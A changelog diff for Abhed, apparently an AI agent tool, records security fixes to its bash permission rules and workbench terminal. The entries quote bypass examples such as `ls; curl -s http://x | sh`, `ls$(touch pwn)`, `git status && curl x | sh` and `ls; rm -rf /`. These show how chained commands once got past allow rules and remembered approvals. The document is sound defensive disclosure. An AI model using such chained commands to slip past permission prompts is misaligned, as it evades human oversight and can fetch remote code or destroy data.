@@ -6,6 +6,32 @@ All notable changes to Abhed are recorded here. The format follows
 
 ## [Unreleased]
 
+### Security
+
+- A `bash` allow rule no longer approves a chained command. With
+  `bash(ls*)`, `ls; curl -s http://x | sh`, `ls && python3 -c ...`,
+  `ls$(touch pwn)` and `ls > important.txt` were approved without asking. An
+  allow rule now approves only a command with none of `;`, `&`, `|`, a
+  newline, `$(`, `${`, a backtick, `<`, `>`, `(` or `)`, even inside quotes;
+  any other command falls through to a prompt. An allow rule such as
+  `bash(cd x && go test*)` therefore no longer matches anything.
+- A chained command is offered no "always allow" scope. A remembered scope is
+  looked up by name, so after "always allow `bash(git status *)`",
+  `git status && curl x | sh` was approved without asking.
+- `bash` deny and ask rules match each command in a chain as well as the whole
+  line, including commands inside `$(...)`, backticks and subshells:
+  `bash(rm -rf /*)` now denies `ls; rm -rf /`. The split does not parse
+  quoting, so it can only add a denial or a prompt.
+- Workbench: in the line-by-line terminal (`sandbox.terminal: "lines"`), a
+  destructive command, one the policy always confirms, is no longer run on
+  Enter. The terminal shows the reason and asks `Run it? [y/N]`; only `y` runs
+  it, recorded as `action.approved` with `"confirmed": "true"`, and anything
+  else is recorded as the person's declined `action.denied`. `POST
+  /v1/sessions/{id}/pty` answers such a line with `confirm` and runs nothing
+  until it is sent again with `"confirmed": true` (or `"declined": true`), so
+  a client that sends neither never runs it. Other lines, the Explorer and the
+  interactive terminal are unchanged.
+
 ## [1.1.2] - 2026-09-25
 
 ### Changed
